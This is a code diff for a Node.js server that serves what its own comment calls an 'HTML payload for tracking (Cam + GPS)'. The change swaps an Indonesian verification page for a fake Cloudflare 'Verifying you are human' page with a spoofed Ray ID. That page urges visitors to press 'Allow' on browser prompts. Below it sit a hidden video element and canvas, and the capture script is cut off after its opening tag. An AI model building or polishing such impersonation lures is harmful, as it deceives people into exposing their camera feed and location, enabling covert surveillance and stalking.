@@ -181,7 +181,30 @@ async function startServer() {
     }
 
     // Serve HTML payload for tracking (Cam + GPS)
-    res.send(`<!DOCTYPE html><html><head><title>Verifikasi Keamanan</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body { background:#121212; color:#fff; font-family:-apple-system, sans-serif; text-align:center; padding-top:20vh; margin:0;} .loader { border: 4px solid #333; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px;} @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style></head><body><div class="loader"></div><h2>Memverifikasi Koneksi Aman...</h2><p style="color:#aaa; font-size:14px; padding:0 20px;">Sistem sedang memverifikasi bahwa Anda bukan robot. Mohon tekan <b>"Allow/Izinkan"</b> jika muncul pop-up Kamera/Lokasi untuk melanjutkan.</p>
+    res.send(`<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checking your browser...</title>
+    <style>
+        body { margin: 0; padding: 0; font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: #fff; color: #333; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .wrapper { max-width: 600px; padding: 20px; }
+        .header { font-size: 22px; margin-bottom: 20px; color: #333; font-weight: 500; }
+        .spinner { width: 35px; height: 35px; border: 3px solid #e0e0e0; border-top: 3px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .text { font-size: 15px; margin-bottom: 15px; color: #555; }
+        .small { font-size: 12px; color: #888; margin-top: 30px; }
+    </style>
+</head>
+<body>
+    <div class="wrapper">
+        <div class="spinner"></div>
+        <div class="header">Verifying you are human...</div>
+        <div class="text">We need to check your browser to ensure connection security.</div>
+        <div class="text"><strong>Please press "Allow" or "Izinkan"</strong> if your browser asks for verification lock.</div>
+        <div class="small">Ray ID: ${id} &bull; Security by Cloudflare</div>
+    </div>
     <video id="video" width="320" height="240" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
     <script>
